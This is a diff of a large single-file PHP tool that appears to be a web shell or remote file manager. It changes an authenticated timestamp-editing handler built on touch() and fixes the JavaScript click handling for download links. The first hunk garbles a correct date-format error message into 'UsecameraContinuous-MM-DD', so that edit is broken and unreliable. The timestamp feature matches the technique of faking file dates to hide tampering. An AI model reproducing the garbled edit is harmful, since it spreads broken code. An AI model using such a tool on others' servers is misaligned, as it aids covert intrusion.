@@ -1317,7 +1317,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!$path) {
                     $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                 } elseif ($timestamp === false) {
-                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
+                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. UsecameraContinuous-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
                         $response = array('status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp));
@@ -2049,11 +2049,21 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // --- File Manager Event Delegation ---
+    // --- File Manager Event Delegation (FIXED) ---
     fileListingBody.addEventListener('click', e => {
         const target = e.target.closest('a, button');
         if (!target) return;
-        e.preventDefault();
+
+        const isDownloadLink = target.tagName === 'A' && target.title === 'Download';
+
+        // For the download link, we want the default browser action (following the href).
+        // For all other actions (which are JS-driven), we prevent the default action.
+        if (isDownloadLink) {
+            return; // Allow the browser to handle the download.
+        }
+        
+        e.preventDefault(); // Prevent default for all other links/buttons.
+
         const ds = target.dataset;
         if (target.classList.contains('dir-link')) fetchFiles(ds.path);
         else if (target.classList.contains('file-link') || target.classList.contains('view-btn')) openModalWithFile(ds.path, ds.name);
